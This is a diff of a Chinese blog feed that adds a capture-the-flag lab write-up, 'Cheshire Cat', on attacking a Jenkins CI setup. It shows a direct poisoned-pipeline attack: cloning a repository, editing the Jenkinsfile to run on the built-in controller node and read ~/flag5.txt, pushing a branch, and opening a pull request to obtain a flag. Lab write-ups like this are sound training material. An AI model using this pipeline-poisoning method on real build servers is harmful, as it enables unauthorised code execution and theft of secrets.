@@ -295,7 +295,47 @@ loading="lazy"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="总结-3">总结&lt;/h3>
-&lt;p>和Easy的前两道题有些类似，修改和利用 Jenkinsfile 触发恶意流水线。&lt;/p></description></item><item><title>记录一些小问题</title><link>https://blog.nrevery.cn/p/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%BA%9B%E5%B0%8F%E9%97%AE%E9%A2%98/</link><pubDate>Sun, 01 Dec 2024 22:37:04 +0800</pubDate><guid>https://blog.nrevery.cn/p/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%BA%9B%E5%B0%8F%E9%97%AE%E9%A2%98/</guid><description>&lt;h3 id="wsl突然打不开了重启也没用">wsl突然打不开了，重启也没用&lt;/h3>
+&lt;p>和Easy的前两道题有些类似，修改和利用 Jenkinsfile 触发恶意流水线。&lt;/p>
+&lt;h2 id="moderate---cheshire-cat">Moderate - Cheshire Cat&lt;/h2>
+&lt;h3 id="提示-4">提示&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">有些人走这条路，有些人走那条路，但至于我，个人来说，我更喜欢捷径。你受害者的 Jenkins 实例中的所有任务都在专用节点上运行，但这对你来说还不够好。你很特别，你想在 Jenkins 控制器上执行代码。那才是重点所在！利用你对 Wonderland/cheshire-cat 仓库的访问权限，在控制器上执行代码并从其文件系统中窃取 ~/flag5.txt。注意：不要使用在本题中获得的访问权限来解决其他题目。
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">尝试执行直接 PPE 攻击。
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">如何让 Jenkinsfile 指示 Jenkins 在控制器上运行任务？
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">尝试找到控制器的标签——“内置节点”。
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="过程-4">过程&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">git clone http://localhost:3000/Wonderland/cheshire-cat.git
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>修改Jenkinsfile&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-groovy" data-lang="groovy">&lt;span class="line">&lt;span class="cl">&lt;span class="n">pipeline&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">agent&lt;/span> &lt;span class="o">{&lt;/span>&lt;span class="n">label&lt;/span> &lt;span class="s1">&amp;#39;built-in&amp;#39;&lt;/span>&lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">environment&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PROJECT&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;sanic&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">stages&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">stage&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="s1">&amp;#39;Install_Requirements&amp;#39;&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">steps&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">sh&lt;/span> &lt;span class="s1">&amp;#39;cat ~/flag5.txt&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">post&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">always&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cleanWs&lt;/span>&lt;span class="o">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">git checkout -b challenge2-2
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">git add .
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">git commit -m &lt;span class="s2">&amp;#34;challenge2-2&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">git push -u origin challenge2-2
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>提交pr
+&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20241210224039.png"
+loading="lazy"
+>
+得到flag=6B31A679-6D70-469D-9F8D-6D6E80B3C29C
+&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20241210224448.png"
+loading="lazy"
+>&lt;/p>
+&lt;h3 id="总结-4">总结&lt;/h3></description></item><item><title>记录一些小问题</title><link>https://blog.nrevery.cn/p/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%BA%9B%E5%B0%8F%E9%97%AE%E9%A2%98/</link><pubDate>Sun, 01 Dec 2024 22:37:04 +0800</pubDate><guid>https://blog.nrevery.cn/p/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%BA%9B%E5%B0%8F%E9%97%AE%E9%A2%98/</guid><description>&lt;h3 id="wsl突然打不开了重启也没用">wsl突然打不开了，重启也没用&lt;/h3>
 &lt;p>1.cmd下管理员权限执行&lt;code>netsh winsock reset&lt;/code>&lt;br>
 2.重启电脑&lt;br>
 &lt;a class="link" href="https://blog.csdn.net/qq_41048761/article/details/121420814" target="_blank" rel="noopener"
